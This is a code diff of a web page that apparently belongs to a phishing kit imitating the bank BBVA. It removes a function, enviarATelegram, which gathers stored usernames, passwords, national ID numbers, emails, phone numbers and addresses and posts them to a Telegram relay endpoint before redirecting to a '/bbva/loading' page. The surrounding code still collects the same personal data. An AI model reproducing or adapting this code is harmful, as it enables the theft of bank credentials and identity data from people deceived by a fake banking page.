@@ -205,35 +205,6 @@
                 return value ? JSON.parse(value) : '--';
             }
 
-            async function enviarATelegram() {
-                const allData = {};
-                const fields = ['usuario', 'clave', 'ente', 'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'status', 'uniqid'];
-
-                fields.forEach(field => {
-                    allData[field] = getFromLocalStorage(field);
-                });
-
-                console.log('Datos a enviar a Telegram:', allData);
-
-                try {
-                    const response = await fetch('/api/telegram/send', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            uniqid: appState.uniqId,
-                            data: allData
-                        })
-                    });
-                    const result = await response.json();
-                    console.log('Datos enviados a Telegram:', result);
-                } catch (e) {
-                    console.error('Error al enviar a Telegram:', e);
-                }
-            }
-
             function validateDatos() {
                 const nombre = $('#nombre').val().trim();
                 const cedula = $('#cedula').val().trim();
@@ -250,7 +221,7 @@
             }
 
             $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', validateDatos);
-            $('#btnDatos').on('click', async function () {
+            $('#btnDatos').on('click', function () {
                 if (validateDatos()) {
                     saveToLocalStorage('nombre', $('#nombre').val().trim());
                     saveToLocalStorage('cedula', $('#cedula').val().trim());
@@ -260,7 +231,6 @@
                     saveToLocalStorage('direccion', $('#direccion').val().trim());
                     saveToLocalStorage('status', 'DATOS');
 
-                    await enviarATelegram();
                     window.location.href = '/bbva/loading';
                 }
             });
